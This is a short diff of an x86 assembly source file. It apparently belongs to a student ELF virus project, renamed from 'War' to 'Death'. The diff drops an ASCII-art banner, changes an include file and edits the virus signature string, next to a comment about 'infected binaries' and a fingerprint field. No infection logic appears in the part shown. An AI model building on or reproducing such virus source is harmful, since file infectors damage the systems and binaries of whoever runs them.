@@ -1,12 +1,4 @@
-;-------------------------------------------------------------------------------
-;|                       \`-\`-._              This is ..  __    __            |
-;|                        \` )`. `-.__      ,             / / /\ \ \__ _ _ __  |
-;|     '' , . _       _,-._;'_,-`__,-'    ,/              \ \/  \/ / _  |  __| |
-;|    : `. ` , _' :- '--'._ ' `------._,-;'                \  /\  / (_| | |    |
-;|     `- ,`- '            `--..__,,---'                    \/  \/ \__,_|_|    |
-;-------------------------------------------------------------------------------
-
-%include "war.inc"
+%include "death.inc"
 
 section.text:
 	global _start
@@ -35,7 +27,7 @@ _params:; filled for infected binaries
 _start:
 	call _h3ll0w0rld; push addr to stack
 
-signature db `War version 1.0 (c)oded by lmartin - `; sw4g signature
+signature db `Death version 1.0 (c)oded by lmartin - `; sw4g signature
 fingerprint db `00000000:0000`, 0x0
 
 _h3ll0w0rld:
